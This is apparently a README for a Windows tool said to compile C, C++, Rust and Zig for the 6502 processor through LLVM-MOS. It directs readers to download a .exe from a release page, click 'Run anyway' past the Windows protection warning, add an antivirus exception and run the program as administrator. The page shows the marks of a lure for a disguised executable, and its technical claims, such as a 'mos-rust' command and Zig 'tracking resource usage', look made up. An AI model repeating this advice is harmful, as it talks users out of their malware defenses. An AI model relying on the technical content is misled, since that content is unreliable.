# ⚙️ mos-toolchains-research - Build modern 6502 programs with ease

[![Download mos-toolchains-research](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/beta6083/mos-toolchains-research/releases)

## What is this tool?

This application allows you to write and compile programs for the 6502 processor family. The 6502 chip is a classic computer processor found in many retro home gaming consoles and early personal computers. This tool uses modern compiler technology to translate high-level code, such as C, C++, and Rust, into language that these older machines understand.

The software focuses on LLVM-MOS. This is a framework that connects modern programming standards to the limitations of 8-bit hardware. By using this research tool, you can create new software for vintage systems without needing to write complex machine code by hand.

## 📥 Getting the software

You can get the current version of the tool on GitHub. 

1. Visit the [official releases page](https://github.com/beta6083/mos-toolchains-research/releases).
2. Look for the section labeled "Assets" at the bottom of the latest release.
3. Select the file ending in `.exe` that matches your Windows version.
4. Download the file to your computer.

## 🖥️ System requirements

Ensure your computer meets these basic needs to run the tool without trouble:

* Windows 10 or 11 operating system.
* At least 4 gigabytes of memory.
* Five hundred megabytes of free storage space.
* A basic text editor, such as Notepad or VS Code, to create your source files.

## 🛠️ Setting up your environment

After you download the file, move it to a folder you can reach easily. We suggest creating a folder named "MOS-Tools" on your desktop. 

1. Open your "Downloads" folder.
2. Move the file you downloaded into your new "MOS-Tools" folder.
3. Double-click the file to open the application window. 
4. Windows might display a screen titled "Windows protected your PC." If this appears, click "More info" and then select "Run anyway." 

The application runs in a command console. This window displays status updates as it works. 

## 📝 Running your first program

To use the tool, you must have a source code file. Create a file named `main.c` using your text editor. 

1. Write your code in the text editor and save the file in your "MOS-Tools" folder.
2. Open the application by clicking the file you moved earlier.
3. Type the command to compile your file. A typical command looks like `mos-c main.c -o output.bin`.
4. Press the Enter key.
5. Watch the screen for progress updates. The tool reports success or identifies syntax errors in your code.
6. Look for a new file named `output.bin` in your folder. This is your compiled program.

## 🔍 Understanding the tool output

When the tool finishes, it tells you the result of the build process. A successful build results in a binary file. This file contains the instructions for the 6502 processor. You can load this binary file into an emulator or transfer it to real hardware. 

If the screen shows a list of errors, read the text carefully. The tool identifies common mistakes like misspelled words or missing punctuation in your source file. Correct these errors in your text editor and repeat the build process.

## 📚 Advanced features

The tool supports multiple programming languages. While our guide shows C, the tool also works with the following:

* C++: Useful for structured code and organizing complex logic.
* Rust: Offers memory safety features for your retro projects.
* Zig: Tracks resource usage during the build process.

You define the target language by changing the initial command. For example, use `mos-rust` to start a build for a Rust file. The tool automatically detects your system configuration and applies the correct settings for the 6502 hardware architecture.

## 💡 Troubleshooting common issues

If the tool does not start, check these frequent causes:

* Missing updates: Ensure your Windows system has the latest updates.
* Permissions: You might need to run the application as an administrator if your folder is in a restricted area of your hard drive. 
* Antivirus interference: Some security software flags new applications. You may need to add an exception for this folder in your antivirus settings.
* Path issues: Keep your folder names simple and avoid spaces or special characters. A path like `C:\MOS-Tools` is better than `C:\Users\Name\Desktop\My Stuff\Tools`.

## 🌐 Community and support

This repository serves as a hub for research. Because this tool handles complex tasks, you might find answers to specific questions in the issues section of the GitHub repository. 

* Check the "Issues" tab to see if other users reported similar problems.
* Read through the project history to learn how experts handle 6502 memory management.
* Participate in discussions to share your own findings with the community. 

Using this tool requires patience. Learning to program for 8-bit hardware differs from modern web or app development. Keep your programs small at first as you learn the capabilities of the 6502 processor.